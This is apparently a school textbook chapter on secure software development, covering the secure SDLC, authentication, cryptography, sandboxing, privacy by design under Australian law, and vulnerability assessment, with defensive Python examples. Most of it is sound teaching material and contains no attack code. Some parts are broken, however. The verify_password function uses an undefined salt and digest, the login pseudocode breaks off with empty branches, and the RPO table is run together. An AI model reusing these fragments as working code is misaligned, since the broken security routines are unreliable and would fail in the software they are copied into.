Why this matters now

In recent years Australians have lived through major data breaches at Optus, Medibank and MediSecure, exposing the personal and health details of millions of people. Many breaches are not Hollywood-style hacks but ordinary mistakes: unvalidated input, weak authentication or sensitive data stored in plain text. With privacy laws tightening, companies now expect every developer to build security in from day one.

In this topic you will cover the syllabus content on secure-by-design development, end-user influence on design, authentication, authorisation and accountability, cryptography, and defending against attacks such as SQL injection and cross-site scripting.

As you read, ask If I were an attacker, where would I try to break this code?

Benefits of Developing Secure Software

🎯 (SE-12-01, SE-12-05)

📌 Describe the benefits of developing secure software

  • data protection
  • minimising cyber attacks and vulnerabilities

Data Protection

Secure software design ensures that personal, financial, and proprietary data is protected from unauthorised access, modification, or destruction throughout its entire lifecycle — whether at rest in a database, in transit across a network, or in active use. Data encryption (e.g., AES-256 for stored data, TLS 1.3 for data in transit) makes intercepted data unreadable to attackers. Access controls ensure only authorised users can retrieve sensitive records. In Australia, the Privacy Act 1988 and its Australian Privacy Principles (APPs) impose legal obligations on organisations to protect personal information — failure results in significant financial penalties and mandatory breach notifications under the Notifiable Data Breaches (NDB) scheme. Beyond legal compliance, effective data protection builds user trust, which is increasingly a critical competitive advantage. A single publicised data breach can permanently destroy a brand's reputation and cause lasting customer attrition.

Minimising Cyber Attacks and Vulnerabilities

Every software vulnerability — an unintended weakness in code — represents a potential entry point for a cyber attacker. Proactively designing software to minimise vulnerabilities reduces the attack surface: the total number of possible ways an attacker could interact with or compromise a system. This is achieved through secure coding practices (input validation, parameterised queries, output encoding), regular security testing (SAST, DAST, penetration testing), and timely patching of dependencies. The economic impact of cyber attacks can be severe: incident response, legal fees, regulatory action and lost business add up, and published industry studies such as IBM's annual Cost of a Data Breach report put the average cost of a breach in the millions of dollars, although the figure differs by year, country and industry. Secure software development converts this reactive, crisis-driven cost into a predictable, manageable investment in engineering quality. Also, minimising vulnerabilities reduces an organisation's exposure to reputational damage, intellectual property theft, and the operational disruption of ransomware attacks that can halt business operations entirely.

A school builds an excursion app that parents use to give consent and pay. The five design decisions below each remove a way in for an attacker, or reduce the damage if one succeeds. None of them makes the app unhackable. Together they make a successful attack rarer, harder and less harmful, which is what "secure" realistically means.

Who benefits

  • Users keep control of their personal information and are less exposed to fraud, identity theft, harassment and the stress of a breach. Users of a secure app can also trust that a message or payment really came from who it says it did.
  • Businesses avoid the costs of a breach (investigation, repair, legal advice, regulator attention, lost customers) and the disruption of ransomware. They also meet their legal duties under the Privacy Act 1988 and can win contracts from customers who check a supplier's security first.
  • Society depends on software to run hospitals, banks, power and water. Secure software keeps those services available and keeps the personal information of millions of people out of criminal hands. Section 17 evaluates the legal and ethical side of this in more detail.
Exam tip: "Describe" the benefits A describe answer gives features and then says what they achieve, in the context of the scenario. For "describe two benefits of developing secure software for a clinic booking system", a full-mark answer names each benefit and links it to a specific feature: "Data protection: patient details are encrypted and only the treating clinician's role can open them, so a stolen database or a curious staff member cannot read them. Minimising attacks: input is validated and queries are parameterised, so an attacker cannot use the booking form to reach the database." Common mistakes are saying only "it keeps data safe", naming a benefit with no feature behind it, and confusing a benefit of secure software with a step in developing it.

Software Development Steps for Secure Code

🎯 (SE-12-01, SE-12-06)

📌 Interpret and apply fundamental software development steps to develop secure code

  • requirements definition
  • determining specifications
  • design
  • development
  • integration
  • testing and debugging
  • installation
  • maintenance
1

Requirements Definition

The team identifies the problem, the target audience, and the critical security and regulatory compliance needs (e.g., the Australian Privacy Principles and, where people in the EU are affected, the GDPR) before any architecture is planned. Security requirements must be explicit at this stage — not assumed. For example, a hospital booking system must define that patient medical records are strictly confidential, accessible only to authorised practitioners, and that all access must be audit-logged.

Tools used

  • Storyboards↗ map secure user navigation flows
  • Process Diaries↗ log initial stakeholder meetings and security constraints
2

Determining Specifications

Defining the precise technical boundaries, hardware constraints, and cryptographic protocols to be used (e.g., AES-256 for storage, TLS 1.3 for transit, bcrypt for password hashing). Specifications must include the maximum input lengths, permitted character sets, and data formats for every user-facing field. A Data Dictionary is created at this stage to define the exact size, format, type, and validation rules for every data field — for example, specifying that a password hash field stores exactly 60 characters in bcrypt format, preventing buffer overflow vulnerabilities from incorrectly sized fields.

3

Design

Creating the blueprint for the secure software architecture. This involves threat modelling — systematically identifying all possible attack vectors against the system using frameworks such as STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). The design phase applies "Security by Design" so security controls are built into the architecture, not bolted on afterward. For example, the authentication flow is designed to automatically lock an account after five failed attempts to prevent brute-force attacks.

Tools used

  • Data Flow Diagrams (DFDs)↗ track how sensitive data moves between user, server, and database
  • Structure Charts↗ map the hierarchy of secure modules
  • Decision Trees↗ model complex authorisation logic
4

Development

The coding phase where programmers apply defensive data input handling, input sanitisation, parameterised queries, and secure session management in every function that handles external data. Developers follow secure coding standards (e.g., OWASP Top 10 guidance) and use version control (Git) to track every change with a full audit trail. For example, all database queries use parameterised statements rather than string concatenation, removing the main cause of SQL injection vulnerabilities. IDE debugging tools — breakpoints, watches, and single-line stepping — are used to trace the execution of security-critical logic.

5

Integration

Combining isolated modules and connecting the software to external services safely. This phase ensures that internal microservices and third-party APIs exchange data securely — API keys must never appear in client-side code or version control history. For example, integrating a payment gateway (such as Stripe) uses OAuth 2.0 tokens so the main application never handles raw credit card numbers — liability and PCI-DSS scope are reduced significantly. CI/CD (Continuous Integration/Continuous Deployment) pipelines run automated security scans on every code merge to catch newly introduced vulnerabilities before they reach production.

6

Testing and Debugging

Rigorously evaluating the software to expose vulnerabilities before deployment. Code is tested against malformed, boundary-exceeding, and malicious inputs to ensure it fails securely — never exposing internal stack traces or system information to the user. For example, sending massive randomised strings into web forms tests for buffer overflow susceptibility; submitting SQL metacharacters tests injection prevention; simulating concurrent requests tests for race conditions. SAST tools scan the source code statically; DAST tools attack the running application from the outside; penetration testers simulate real-world attacker techniques.

7

Installation

Deploying the software to the live production environment with a hardened configuration. "Hardening" involves closing all unused network ports, disabling default accounts and guest access, removing development tools and debug interfaces from production builds, and configuring firewalls and intrusion detection systems. For example, a web application is deployed behind a Web Application Firewall (WAF) within a Demilitarised Zone (DMZ), with all server communication over encrypted SSH channels. The principle of least privilege is applied — the application's database user account has only the specific permissions required to function, not full administrative rights.

8

Maintenance

The longest phase of the SDLC. Involves continuous security monitoring via Security Information and Event Management (SIEM) dashboards, responding to newly discovered vulnerabilities in third-party dependencies, rotating cryptographic keys on schedule, and developing and deploying patches for zero-day exploits. For example, when a critical vulnerability (CVE) is published in an open-source library the application depends on, an emergency patch is developed, tested and deployed as fast as the organisation's patching policy requires, often within days for critical flaws. Log Books and Process Diaries meticulously document every breach response action and recovery procedure for regulatory compliance and post-incident review.

How End Users Influence Secure Design

🎯 (SE-12-01, SE-12-07)

📌 Describe how the capabilities and experience of end users influence the secure design features of software

A technically perfect security system that users cannot or will not use correctly provides no real protection. Engineers must design security features that are robust and usable — the two goals must be balanced, not traded off against each other.

Novice Users

Users with low technical literacy require guided, intuitive security flows. If a password policy demands 16+ characters with special symbols but provides no password strength indicator, users will choose simple, guessable passwords or reuse passwords from other sites. Design response: embed real-time password strength meters, offer integration with password managers, and use biometric authentication (fingerprint, Face ID) to eliminate the password burden entirely where appropriate.

Experienced Users

Technical users may bypass restrictive security controls if they impede productivity — for example, using shared accounts to avoid repeated MFA prompts. Design response: offer trusted device registration (so MFA is only required on new devices), provide API token access for developers rather than forcing GUI logins, and support hardware security keys (FIDO2/WebAuthn) for the fastest and most secure authentication experience.

Users with Disability

CAPTCHA challenges that rely on image recognition or audio discrimination may be inaccessible to users with visual or auditory impairments. Time-limited security prompts may disadvantage users with cognitive or motor disabilities. Design response: provide alternative accessible CAPTCHA options, extend timeout periods, ensure all security flows are keyboard-navigable, and test with screen readers to verify accessibility.

Context of Use

A user completing a mobile banking transaction in a noisy, public environment cannot safely respond to an SMS-based OTP if their phone screen is visible to bystanders. Engineers must consider the physical and social context in which security features are used — offering push notification authentication (tap to approve on a trusted device) rather than displaying a readable code on screen in high-risk public contexts.

Key Principle Security features that users consistently bypass or disable provide zero actual protection. The most secure solution is the one users will actually engage with correctly — design must account for real human behaviour, not idealised behaviour.

A password check that supports users rather than punishing them can be written in a few lines. It rewards length, blocks the most common choices and never insists on symbols:

Python — a user-friendly password check
COMMON = {"password", "password1", "password123", "12345678", "qwertyuiop", "iloveyou123"}

def check_password(password, username):
    """Return a list of problems; an empty list means the password is acceptable."""
    problems = []
    if len(password) < 12:
        problems.append("use at least 12 characters (longer is better)")
    if password.lower() in COMMON:
        problems.append("this is one of the most commonly used passwords")
    if username.lower() in password.lower():
        problems.append("do not include your username")
    return problems          # no forced symbols and no forced changes: they push people to weak patterns

for pw in ("Password123", "purple-tractor-holiday", "ava_n2008!"):
    result = check_password(pw, "ava_n")
    print(f"{pw:24}", result if result else "OK")

Security Concepts in Software Design

🎯 (SE-12-04)

📌 Explore fundamental software design security concepts when developing programming code

  • confidentiality
  • integrity
  • availability
  • authentication
  • authorisation
  • accountability

Confidentiality

Ensuring data is accessible only to authorised entities. Implementation: Data encryption (AES-256 at rest; TLS 1.3 in transit), role-based access control (RBAC), and data classification policies that restrict who can query which database tables. Example: Patient medical records in a hospital system are encrypted and accessible only to the treating clinician — even database administrators cannot view the plaintext content.

Integrity

Guaranteeing that data has not been maliciously or accidentally altered without detection. Implementation: Cryptographic hashing (SHA-256, SHA-3) generates a unique fingerprint of data; any modification produces a completely different hash, immediately revealing tampering. Digital signatures further bind the hash to a verified sender. Example: A software update package is published with its SHA-256 hash; users verify the hash after downloading to confirm the file has not been corrupted or modified by an attacker.

Availability

Ensuring that systems remain operational and accessible to authorised users when needed. Implementation: Redundant server infrastructure, load balancers, DDoS mitigation services (e.g., Cloudflare), rate limiting, and disaster recovery plans with defined Recovery Time Objectives (RTOs). Example: A banking platform uses auto-scaling cloud infrastructure to absorb traffic spikes during tax season, and Cloudflare absorbs volumetric DDoS attacks before they reach the application servers.

Authentication

Verifying the identity of a user or system before granting access. Implementation: Password hashing (bcrypt with salt), Multi-Factor Authentication (MFA — something you know + something you have/are), biometrics, and hardware security keys. Example: A corporate VPN requires employees to enter their password and then approve a push notification on their registered smartphone — two independent factors that an attacker would need to compromise simultaneously.

Authorisation

Determining what an authenticated user is permitted to do — enforcing the principle of least privilege. Implementation: Role-Based Access Control (RBAC) assigns permissions to roles (Admin, Editor, Viewer) rather than individuals; users are assigned the minimum role required for their function. Example: A content management system grants "Editor" users the ability to create and edit posts, but not to delete them or manage other user accounts — those actions are restricted to the "Admin" role.

Accountability

Tracing every action back to a specific authenticated user through immutable audit logs, ensuring non-repudiation — a user cannot deny having performed an action that was logged. Implementation: Append-only audit log tables recording user ID, timestamp, action type, and affected resource for every sensitive operation. Example: A financial system records every account transfer with the authenticated user's ID, the exact timestamp, source account, destination account, and amount — providing an unalterable chain of evidence for forensic investigation.

Worked example: an audit log you can trust

Accountability only works if the log itself cannot be quietly edited. One simple technique is to chain the entries: each entry's hash is calculated from the entry and the hash of the one before it, so changing any old entry breaks every hash after it. This one small program uses integrity (hashing) to deliver accountability (a trustworthy record of who did what).

Python — a tamper-evident audit log
import hashlib
import json

def entry_hash(entry, previous_hash):
    text = previous_hash + json.dumps(entry, sort_keys=True)
    return hashlib.sha256(text.encode()).hexdigest()

log = []                                   # list of (entry, hash) pairs
def audit(user, action, resource, when):
    previous = log[-1][1] if log else "start"
    entry = {"user": user, "action": action, "resource": resource, "time": when}
    log.append((entry, entry_hash(entry, previous)))   # each entry is chained to the one before

def verify_chain():
    previous = "start"
    for number, (entry, stored) in enumerate(log, start=1):
        if entry_hash(entry, previous) != stored:
            return f"tampering detected at entry {number}"
        previous = stored
    return "log intact"

audit("ms_lee", "edit_marks", "class 12A", "2026-03-02T09:14")
audit("ms_lee", "view_marks", "class 12B", "2026-03-02T09:20")
audit("ava_n", "view_marks", "own record", "2026-03-02T10:02")
print(verify_chain())
log[0][0]["user"] = "someone_else"         # an attacker edits history
print(verify_chain())
Expected output
log intact
tampering detected at entry 1

A real system would also write the log to a separate, append-only store that the application account cannot modify, and copy it off the server. Chaining shows tampering; it does not by itself prevent it.

Data protection in code: hashing passwords with a salt

A website should never be able to tell you your password, because it should never have stored it. It stores a hash instead: a one-way fingerprint of the password. Two extra ideas make a stolen table of hashes much harder to use:

  • A salt is a random value, different for every user, that is mixed in before hashing and stored beside the hash. It is not secret. Its job is to make the same password hash to a different value for every user, so an attacker cannot use one pre-built lookup table (a rainbow table) against the whole database and must attack each account separately.
  • A slow hash function (a key derivation function such as PBKDF2, bcrypt or Argon2) repeats the calculation many thousands of times. That costs a real user a fraction of a second, but it multiplies the cost of every guess an attacker makes. A fast hash such as plain SHA-256 or MD5 is the wrong tool for passwords because attackers can try huge numbers of guesses per second.

The standard library provides hashlib.pbkdf2_hmac, secrets for random values and hmac.compare_digest for a constant-time comparison, so the whole idea can be shown without installing anything:

Python — salted, slow password hashing with the standard library
import hashlib
import hmac
import secrets

ITERATIONS = 600_000          # slows down every guess an attacker makes

def hash_password(password, salt=None):
    if salt is None:
        salt = secrets.token_bytes(16)          # a new random salt for every user
    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, ITERATIONS)
    return salt.hex() + "$" + digest.hex()      # store the salt beside the hash

def verify_password(password, stored):

    candidate = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, ITERATIONS)
    return hmac.compare_digest(candidate.hex(), digest_hex)   # constant-time compare

Security in code: the login decision

Authentication and lockout come together in one small algorithm. In NESA pseudocode, with each nested decision written as an ELSE containing an IF and one ENDIF for every IF:

  IF accountIsLocked(username) THEN
    RETURN "Try again later"
  ELSE
    IF NOT validFormat(username, password) THEN

    ELSE

Cryptography in Security by Design

Cryptography is the practice of securing information by transforming it into an unreadable form for anyone who does not hold the decryption key. In security-by-design, cryptography is not an optional add-on — it is specified in the requirements phase and embedded in the architecture from the first line of code.

Symmetric EncryptionThe same key is used for both encryption and decryption (e.g., AES-256). Extremely fast — suited for encrypting large volumes of data at rest such as database fields, disk volumes, or file archives. The key distribution challenge (how do both parties safely share the same key?) is solved by asymmetric encryption.
Asymmetric EncryptionUses a mathematically linked key pair — a public key (freely shared, used to encrypt) and a private key (secret, used to decrypt). RSA-2048 and ECC are common algorithms. Used in TLS handshakes to securely exchange a symmetric session key at the start of every HTTPS connection, and in digital signatures to verify identity.
HashingA one-way mathematical function producing a fixed-length fingerprint (hash) of any input — impossible to reverse. SHA-256 produces a 64-character hex string. Used for password storage (bcrypt adds a random salt before hashing to prevent rainbow table attacks), verifying file integrity, and digital signatures.
Digital SignaturesThe sender hashes their message, then encrypts the hash with their private key — the result is the signature. The recipient decrypts it with the sender's public key and compares it to their own hash of the message. A match proves authenticity and integrity, providing non-repudiation.

Cryptography in practice: hashing, signing and comparing

Choosing the right tool matters more than the maths. The rules below summarise how cryptography is used inside secure software:

  • Never invent your own algorithm. Use vetted libraries and protocols. A home-made cipher can look convincing and be trivially broken. Security does not depend on keeping the algorithm secret; it depends on keeping the key secret.
  • Hash what you never need to read back (passwords). Encrypt what you do (a Medicare number the clinic must display). Hashing is one-way; encryption is reversible with the key.
  • Protect the keys. Keys belong in a secrets manager or environment variable, never in source code or the same database as the data they protect, and they should be rotated.
  • Use a secure random source. Python's secrets module is designed for tokens, salts and session IDs. The random module is predictable and must not be used for security.
  • Encoding is not encryption. Base64 only changes how bytes are written down; anyone can reverse it with no key.

A plain hash such as SHA-256 can show that a file was not corrupted, but an attacker who changes a message can simply recompute the hash. An HMAC mixes a secret key into the hash, so only someone who holds the key can produce a valid tag. That gives integrity (the message was not changed) and authenticity (it came from a key holder). Digital signatures use a public and private key pair instead, which adds non-repudiation because only the private key holder could have signed.

Python — detecting a changed message with HMAC
import hashlib
import hmac

SHARED_KEY = b"demo-key-not-for-real-use"      # real keys come from a secrets manager

def sign(message):
    return hmac.new(SHARED_KEY, message, hashlib.sha256).hexdigest()

def verify(message, tag):
    return hmac.compare_digest(sign(message), tag)

order = b"pay:20:canteen"
tag = sign(order)
print(verify(order, tag))                      # untouched message
print(verify(b"pay:2000:attacker", tag))       # changed message, old tag
print(hashlib.sha256(order).hexdigest()[:16])  # a plain hash: anyone can recompute it

Sandboxing in Security by Design

Sandboxing executes potentially untrusted code in a strictly isolated, restricted environment that has no access to the host operating system, filesystem, network, or other running processes unless explicitly permitted. If the sandboxed code is malicious or compromised, it cannot escape the sandbox to cause broader harm. Security-by-design embeds sandboxing as an architectural decision for any component that handles untrusted external input.

Browser Sandboxing

Modern browsers run web pages in sandboxed processes, typically separating sites and tabs from the operating system and from each other. A malicious website cannot read files from your hard drive or access memory used by your banking tab. This is sandboxing applied at the operating system level — foundational to web security.

Container Isolation

Docker containers sandbox applications from each other on the same server. A compromised web application container cannot access the database container's files or the host's root filesystem. This limits the blast radius of a successful attack to a single isolated service.

Code Execution Sandboxes

Online coding platforms (e.g., Replit, LeetCode) execute user-submitted code inside sandboxes — preventing a malicious user's code from reading other users' data or compromising the host server. The sandbox enforces CPU time limits, memory limits, and network access restrictions.

Limits of sandboxing

A sandbox reduces damage; it does not remove the need for other defences. Designers decide what to restrict and what to allow through, and the list below is the usual set of dials:

What is restrictedExample
FilesThe code can see one scratch folder and nothing else on the disk
NetworkNo outgoing connections, or only to one named server
ResourcesA cap on CPU time, memory and running time, so an infinite loop cannot take the server down
System actionsThe code cannot start other programs or change system settings
PrivilegesIt runs as an ordinary account with no administrator rights
  • Containers isolate applications but share the host's operating system kernel, so their isolation is weaker than a full virtual machine. A flaw in the shared kernel can, in principle, let code escape.
  • Sandbox escapes are real vulnerabilities that get patched, which is why sandboxing is combined with least privilege and patching rather than trusted alone.
  • A timeout in your own code is not a sandbox. Calling subprocess.run(..., timeout=2) limits how long a program runs, but it does not stop that program reading files or using the network. True isolation comes from the operating system, a container or a virtual machine.
  • On the web, the HTML sandbox attribute applies the same idea to embedded content. An <iframe src="widget.html" sandbox="allow-scripts"> may run scripts but is cut off from the page's cookies and storage, and cannot submit forms or open pop-ups unless those permissions are added.

Cryptography and sandboxing are two techniques. They work best when the whole design follows a small set of principles that experienced security engineers keep returning to:

Privacy by Design

🎯 (SE-12-04, SE-12-05)

📌 Use and explain the ‘privacy by design’ approach in the development of software solutions

  • proactive not reactive approach
  • embed privacy into design
  • respect for user privacy

Privacy by Design (PbD), developed by Dr Ann Cavoukian, is a framework that treats privacy not as a legal compliance afterthought, but as a fundamental design requirement embedded into the architecture of software systems from the outset. Its ideas appear in privacy law: the GDPR (Article 25) requires data protection by design and by default, and the Australian Privacy Principles require similar practices (see below).

Proactive Not Reactive Approach

A proactive approach means anticipating and preventing privacy violations before they occur, rather than detecting and remedying them after the fact. In practice, this means conducting a Privacy Impact Assessment (PIA) during the requirements phase — before architecture is finalised — to identify every point at which personal data enters, is processed, stored, or exits the system. Each data flow is scrutinised: Is this data actually necessary? Could we achieve the same outcome with anonymised or aggregated data? Could we collect less? By identifying and eliminating unnecessary data collection before code is written, engineers prevent entire categories of privacy risk from ever materialising. For example, a fitness app that collects precise GPS location for route tracking should ask: can we achieve the feature with neighbourhood-level precision rather than exact coordinates? Reducing data granularity proactively reduces the consequences of any future breach.

Embedding Privacy into Design

Privacy must be the default setting of the system — requiring no action from the user to be protected. The most privacy-respecting option must be the path of least resistance. This principle directly counters the industry-wide practice of defaulting to maximum data collection and sharing, requiring users to navigate complex settings menus to opt out. Specific design implementations include: new social media profiles default to private; marketing email preferences default to unsubscribed; location sharing defaults to off; analytics tracking requires explicit opt-in consent, not pre-ticked boxes. The GDPR requires privacy-friendly defaults, and they are good practice under the Australian Privacy Act. Architecturally, data minimisation (collecting only what is genuinely necessary) and purpose limitation (using data only for the stated collection purpose, not secondary commercial uses) must be enforced at the database schema level — if a field does not exist, it cannot be misused or breached.

Respect for User Privacy

Systems must offer users meaningful, granular, and genuinely exercisable control over their personal data. This is distinguished from performative compliance (lengthy privacy policies that nobody reads) by providing real mechanisms for data agency:

Granular Consent ControlsCookie consent banners must allow users to independently accept functional cookies while rejecting analytics or advertising cookies — not force an all-or-nothing choice. Consent must be freely given, specific, informed, and unambiguous — under the GDPR a pre-ticked box is not valid consent, and OAIC guidance says consent should not be assumed from silence or inaction.
Data PortabilityUnder the GDPR people have a right to data portability, and in Australia the Consumer Data Right lets consumers in designated sectors such as banking and energy share their data with accredited providers. Even where no law requires it, letting users export their data in a standard, machine-readable format (e.g., JSON, CSV) respects their control and prevents vendor lock-in. Google Takeout and Apple's Data and Privacy portal are examples.
Right to ErasureThe GDPR gives people a right to erasure (the "right to be forgotten"). Australia has no general equivalent, but APP 11 requires personal information to be destroyed or de-identified when it is no longer needed, and good design lets users delete their accounts. Either way, the system must be architecturally capable of honouring a deletion request — requiring cascading deletes across all databases, backups, and logs that hold the user's data. Systems that cannot delete data have failed the privacy-by-design principle at the architecture level.
No Dark PatternsUser interfaces must not use manipulative design (dark patterns) to obscure privacy controls — such as making the "Reject All" button tiny and grey while the "Accept All" button is large and brightly coloured, or burying privacy settings five menus deep. Respect requires friction-free access to privacy controls.

Privacy by design in code

Three practices show up directly in a program: data minimisation (store only what the feature needs), pseudonymisation (analytics sees a stable code, not the person's identity) and retention limits (data is deleted when it is no longer needed).

Python — minimisation, pseudonymisation and retention
import hashlib
import hmac
from datetime import date

ANALYTICS_KEY = b"keep-this-secret-outside-the-code"     # in real life: a secrets manager, not source code

def register(form):
    """Keep only what the app needs (data minimisation)."""
    return {
        "first_name": form["first_name"],
        "birth_year": int(form["birth_date"][:4]),        # a year is enough to check age band
        # NOT stored: full date of birth, home address, phone number
    }

def pseudonym(email):
    """Analytics sees a keyed hash, not the email address."""
    return hmac.new(ANALYTICS_KEY, email.lower().encode(), hashlib.sha256).hexdigest()[:12]

RETENTION_YEARS = 2
def should_delete(last_login, today):
    return (today - last_login).days > RETENTION_YEARS * 365

form = {"first_name": "Ava", "birth_date": "2008-03-14", "address": "1 Example St", "phone": "0400 000 000"}
print(register(form))
print(pseudonym("Ava@example.com") == pseudonym("ava@example.com"))
print(should_delete(date(2023, 5, 1), date(2026, 5, 2)))
print(should_delete(date(2025, 5, 1), date(2026, 5, 2)))

The keyed hash gives analytics the same code for the same person (the email is lower-cased first, so the two spellings match) without exposing the email address. Anyone who holds the key could still re-identify people, which is why pseudonymised data is still personal information. The retention check flags accounts inactive for more than two years for deletion.

Privacy by design and Australian law

Australia's Privacy Act 1988 has no clause titled "privacy by design", but several Australian Privacy Principles require the same behaviour:

  • APP 1 requires an organisation to take reasonable steps to implement practices, procedures and systems that ensure it complies with the APPs. Building privacy into the system is the practical way to do that.
  • APP 2 lets people deal with an organisation anonymously or under a pseudonym where practicable.
  • APP 3 limits collection to what is reasonably necessary, which is data minimisation.
  • APP 11 requires reasonable security steps and requires personal information to be destroyed or de-identified when it is no longer needed, which is a retention limit.

The OAIC recommends a privacy impact assessment for projects that handle personal information, and Australian Government agencies must complete one for high-privacy-risk projects. The Privacy and Other Legislation Amendment Act 2024 made further reforms, including a statutory tort for serious invasions of privacy and a requirement to develop a Children's Online Privacy Code, and reform is continuing, so check the OAIC website for the current position. The European GDPR does name "data protection by design and by default" explicitly (Article 25), which matters if an Australian product serves people in the EU.

Testing Security and Resilience

🎯 (SE-12-06, SE-12-08)

📌 Test and evaluate the security and resilience of software by determining vulnerabilities, hardening systems, handling breaches, maintaining business continuity and conducting disaster recovery

Determining Vulnerabilities

Vulnerabilities must be identified before attackers find them. Engineers conduct vulnerability assessments — systematic scans of the application and its infrastructure to catalogue all known weaknesses (unpatched software, misconfigured services, exposed admin interfaces, default credentials). Vulnerability scanners (e.g., Nessus, OpenVAS) produce prioritised lists of findings rated by CVSS (Common Vulnerability Scoring System) severity. These findings are remediated in priority order. Each organisation sets its own targets (for example, critical findings first and within days), and the Essential Eight expects urgent patching where a working exploit exists.

Threat Modelling

Threat modelling is a systematic process of identifying all possible attack vectors against a system. A Data Flow Diagram (DFD) is a visual tool used to model how data moves through a system, identifying where sensitive information flows between users, servers, databases, and external services. By mapping these data flows, engineers can identify vulnerable points in the architecture and design appropriate security controls at each stage.

Hardening Systems

System hardening reduces the attack surface by eliminating everything that is not strictly necessary for the system's function. A hardened production server has: all unnecessary network ports closed by firewall rules; all unused software packages, services, and user accounts removed; default passwords and credentials changed; logging enabled for all administrative actions; and automatic security updates configured. A hardened web application has: Content Security Policy (CSP) headers preventing unauthorised script execution; HTTP Strict Transport Security (HSTS) preventing protocol downgrade attacks; security headers (X-Frame-Options, X-Content-Type-Options) blocking clickjacking and MIME sniffing attacks.

Handling Breaches

An Incident Response Plan (IRP) defines the pre-agreed, structured process for managing a detected security breach: (1) Containment — immediately isolate affected systems to prevent lateral movement (e.g., take the compromised server offline, revoke compromised credentials). (2) Eradication — identify and remove the root cause (malware, backdoor, compromised account). (3) Recovery — restore systems from known-good backups and verify integrity before bringing them back online. (4) Post-Incident Review — document what happened, how it was detected, how long it took to contain, and what changes will prevent recurrence. Under Australia's NDB scheme, an organisation that suspects an eligible data breach must assess it within 30 days and, once it has reasonable grounds to believe one has occurred, notify the Office of the Australian Information Commissioner (OAIC) and affected individuals as soon as practicable.

Business Continuity and Disaster Recovery

Business Continuity Planning (BCP) ensures that critical business functions can continue during and after a major incident — whether a cyber attack, natural disaster, or infrastructure failure. Key metrics: RTO (Recovery Time Objective) — the maximum acceptable downtime (e.g., 4 hours); RPO (Recovery Point Objective) — the maximum acceptable data loss (e.g., 1 hour of transactions). Achieving these targets requires: geographically redundant server infrastructure; automated failover to standby systems; regular off-site encrypted backups with verified restoration procedures; and documented, regularly practised disaster recovery drills so that the response under pressure is familiar, not improvised.

Worked example: a small vulnerability assessment

Vulnerability scanners compare what is installed against a list of published weaknesses. Each published weakness has an identifier (a CVE number) and a severity score on the CVSS scale from 0.0 to 10.0. The standard qualitative bands are Low (0.1 to 3.9), Medium (4.0 to 6.9), High (7.0 to 8.9) and Critical (9.0 to 10.0). The program below does the core job of a scanner on a made-up project. The package names and advisories are fictional; real tools read them from public databases.

Python — matching installed libraries to advisories
# A toy vulnerability assessment. Package names and advisories are fictional.
ADVISORIES = [
    {"id": "EXAMPLE-0001", "package": "fastforms", "fixed_in": (2, 4, 1), "cvss": 9.8},
    {"id": "EXAMPLE-0002", "package": "pdfmaker",  "fixed_in": (1, 9, 0), "cvss": 5.3},
    {"id": "EXAMPLE-0003", "package": "fastforms", "fixed_in": (2, 1, 0), "cvss": 7.5},
]
INSTALLED = {"fastforms": (2, 0, 3), "pdfmaker": (2, 0, 0), "chartkit": (1, 0, 0)}

def severity(score):                       # the CVSS qualitative rating scale
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    return "Low"

findings = []
for adv in ADVISORIES:
    version = INSTALLED.get(adv["package"])
    if version is not None and version < adv["fixed_in"]:      # tuples compare left to right
        findings.append((adv["cvss"], adv["id"], adv["package"], version, adv["fixed_in"]))

for score, ident, pkg, have, fix in sorted(findings, reverse=True):     # worst first
    print(f"{severity(score):8} {score:>4}  {ident}  {pkg} {'.'.join(map(str, have))} -> upgrade to {'.'.join(map(str, fix))}")

Two of the three advisories apply, because pdfmaker 2.0.0 is already newer than the version that fixed its problem, and chartkit has no advisory. Real teams also weigh how exposed the system is and how valuable its data is, so a medium finding on an internet-facing login page can outrank a high finding on an internal test server. A zero-day is a flaw with no published fix yet, which no scan of known vulnerabilities can find; the defence is layers (hardening, least privilege, monitoring) and fast patching once a fix exists. The ASD Essential Eight, Australia's baseline set of mitigation strategies, treats patching applications and operating systems as core controls.

If an organisation covered by the Privacy Act only suspects an eligible breach, it must assess it quickly and, at the latest, within 30 days. Once it has reasonable grounds to believe an eligible breach has happened, it must prepare a statement and notify the OAIC and the affected individuals as soon as practicable. Taking remedial action that makes serious harm unlikely can mean notification is not required.

Business continuity: working out RPO and RTO

Two numbers set the requirements for backups and recovery. The RPO is how much recent data the business can afford to lose, measured in time. The RTO is how long the service can be down. Here is a worked calculation for a booking system, using illustrative figures:

Backups run every 6 hours. What is the worst-case data loss?A failure just before the next backup loses everything since the last oneUp to 6 hours, so the achieved RPO is 6 hours

Against ransomware, at least one copy must be offline or unchangeable so the attacker cannot encrypt it too, and the restore process must be tested regularly, because an untested backup is only a hope. Regular backups are one of the Essential Eight.

Exam tip: "Test and evaluate" resilience Test is the actions (scan, attack, restore from backup); evaluate is the judgement about the result. A full-mark answer states what was tested, what the result was, and whether it met a stated target, then recommends what to change: "A restore test took five hours, so the four-hour RTO was not met. The cause was manually rebuilding the server, so the team should automate the build and re-test." Answers that only describe the tests earn few marks. Use RTO and RPO correctly (RTO is downtime, RPO is lost data), and remember that hardening reduces the chance of a breach while continuity and recovery reduce its impact.

🎯 (SE-12-06, SE-12-08)

📌 Apply and evaluate strategies used by software developers to manage the security of programming code

Code Review A human engineer manually reads and evaluates another developer's code, checking for security flaws, logic errors, and adherence to secure coding standards before the code is merged. Code review for security: a checklist

A reviewer with a checklist finds far more than one who just "reads it through". Useful questions for any change that touches user input, data or access:

  • Is every input validated on the server, and is the output encoded for where it goes (HTML, SQL, file path, URL)?
  • Are all database queries parameterised, and are all identifiers (such as a sort column) checked against an allowlist?
  • Does every route check who the user is and what they may do, including "can this user see this record"?
  • Are secrets (keys, passwords, tokens) kept out of the code, the logs and the error messages?
  • What happens when it fails? Does it deny access, log the detail privately and show a generic message?
  • Is any new library maintained, from a trusted source and free of known vulnerabilities?
  • Are there tests for the misuse case, not only for the normal case?

Penetration testing: authorised, scoped and reported

